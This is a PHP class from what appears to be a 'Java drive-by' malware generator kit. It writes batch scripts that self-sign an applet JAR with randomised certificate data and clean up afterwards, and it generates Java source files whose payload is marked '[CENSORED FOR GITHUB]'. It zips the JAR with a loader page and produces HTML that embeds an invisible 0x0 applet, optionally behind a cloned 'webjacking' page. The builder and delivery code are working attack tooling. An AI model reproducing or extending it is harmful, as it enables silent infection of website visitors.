<?php
class Mod_JavaDriveBy{
	/**
	 * This function create a batch file with all needed command for the java driveby generation
	 */
	public function createBat($jarname,$connName,$jdbSignName)
	{
		$mod_generate = new Mod_Generate();
		// Generate the name
		$batchFile['name'] = $jarname;
		$batchFile['key'] = $mod_generate->genString(3);
		$batchFile['signature'] = $mod_generate->genString(5);
		$batchFile['var6'] = $mod_generate->genString(8);
		$batchFile['var7'] = $mod_generate->genString(10);
		$batchFile['var8'] = $connName;
		$batchFile['var9'] = $jdbSignName;
		$batchFile['code'] = 
		"@echo off
		cd C:/Users/Administrator/Desktop/Javasource
		title Java Drive-By - Compiling
		set c=".$batchFile['signature']."
		keytool -genkey  -dname \"cn=\"".$mod_generate->genString(5)."\", ou=\"".$mod_generate->genString(5)."\", o=\"".$mod_generate->genString(5)."\", c=\"".$mod_generate->genLetters(2)."\"\" -keyalg rsa -alias %c% -keystore \"".$batchFile['key'].".jks\" -keysize 2048 -keypass \"".$batchFile['var6']."\" -storepass \"".$batchFile['var7']."\" -validity 180
		keytool -export -keystore \"".$batchFile['key'].".jks\" -keypass \"".$batchFile['var6']."\" -storepass \"".$batchFile['var7']."\" -alias %c% -file Certificate.crt
		javac ".$batchFile['var9'].".java
		javac ".$batchFile['var8'].".java
		jar cvf ".$batchFile['name'].".jar ".$batchFile['var9'].".class ".$batchFile['var8'].".class
		jarsigner -keypass \"".$batchFile['var6']."\" -keystore \"".$batchFile['key'].".jks\" -storepass \"".$batchFile['var7']."\" ".$batchFile['name'].".jar %c%
		del Certificate.crt
		del ".$batchFile['key'].".jks
		del ".$batchFile['var9'].".class
		del ".$batchFile['var8'].".class
		move \"".$batchFile['name'].".jar\" \"C:\\xampp\\htdocs\\bp\\generator\\ls\\userdownload\\".$batchFile['name'].".jar\"
		cd %userprofile%
		del .keystore
		cls
		exit";
		
		$batchFile['name'] .= ".bat";
		
		// Create the batch file with all informations on them
		$fileCreate = fopen("C:/xampp/htdocs/bp/generator/ls/bat/".$batchFile['name']."","w");
		fputs($fileCreate,$batchFile['code']);
		fclose($fileCreate);
		
		return "C:/xampp/htdocs/bp/generator/ls/bat/".$batchFile['name']."";
	}
	
		public function createJava($redirection,$className,$activeLog,$infectionPath,$dwnlMethod,$jdbName,$connName,$jarName,$jdb)
	{
		if(!$className) return;
		$className = htmlspecialchars(addslashes($className));
		
		$mod_generate = new Mod_Generate();
		
		// Generate random strings 
		$x = 1;
		while($x <= 40)
		{
			$string[$x] = $mod_generate->genLetters(10);
			$x++;
		}
		
		
		$l['long'] = $mod_generate->genNumbers(18);
		
		$genSerial = $mod_generate->genString(8).'-'.$mod_generate->genString(4).'-'.$mod_generate->genString(4).'-'.$mod_generate->genString(4).'-'.$mod_generate->genString(12);
		
		$codeJava = '[CENSORED FOR GITHUB]';
		$originalClassName = $className;
		$className .= ".java";
		// Create the first file (.java)
		$fileCreate = fopen("C:/Users/Administrator/Desktop/Javasource/".$className."","w");
		fputs($fileCreate,$codeJava);
		fclose($fileCreate);
		
		
		// Generate the connection file
		$codeJava = '[CENSORED FOR GITHUB]';
		
		$connName .= ".java";
		
		// Create the first file (.java)
		$fileCreate = fopen("C:/Users/Administrator/Desktop/Javasource/".$connName."","w");
		fputs($fileCreate,$codeJava);
		fclose($fileCreate);
		
		return $genSerial;
	}
	
	public function createZip($i,$jarName,$activeLog)
	{
	
		
		$mod_generate = new Mod_Generate();
		$zipName = $mod_generate->genString(10);
		$zipName .= ".zip";
		$zip = new ZipArchive;
		
		
		// Declare path
		$htmlPath = "C:/xampp/htdocs/bp/generator/ls/index/".$jarName.".php";
		$jarName .= ".jar";
		$userDownload = "C:/xampp/htdocs/bp/generator/ls/userdownload/".$jarName."";
		$load = "C:/xampp/htdocs/bp/generator/ls/zip/panelnopanel/load.php";
		$infoPath = "C:/xampp/htdocs/bp/generator/ls/zip/panelnopanel/TO_READ.txt";
		$zipPath = 'C:/xampp/htdocs/bp/generator/ls/zip/'.$zipName.'';

		if($zip->open($zipPath, ZipArchive::CREATE) === TRUE)
		{
				if($i == true)
				{
					$zip->addFile($userDownload,$jarName);
					$zip->addFile($htmlPath,'index.php');
					$zip->addFile($load, 'load.php');
					$zip->addFile($infoPath,'Before_you_start.txt');
					$zip->close();
				}
				else
				{
					$zip->addFile($userDownload,$jarName);
					$zip->addFile($htmlPath,'index.php');
					$zip->addFile($infoPath,'Before_you_start.txt');
					$zip->close();
				}
		}	
		else
		 print "Error occured : Bite de cheval.";
		
		return $zipName;
	}
	
	public function createHtml($jarName,$jdbSignName,$webJacking)
	{
		// var_dump($webJacking);
		if($webJacking != "no")
		{
			$codeHtml = '<?php print file_get_contents("'.$webJacking.'"); ?>
							<applet archive="'.$jarName.'.jar" code="'.$jdbSignName.'.class" width="0" height="0">';
		}
		else
		{
			$codeHtml = '
			<html>
			<body>

			<applet archive="'.$jarName.'.jar" code="'.$jdbSignName.'.class" width="0" height="0"></applet>
			
			</body>
			</html>';
		}
		
		$jarName .= ".php";
		$fileCreate = fopen("C:/xampp/htdocs/bp/generator/ls/index/".$jarName."","w");
		fputs($fileCreate,$codeHtml);
		fclose($fileCreate);
	}
}
?>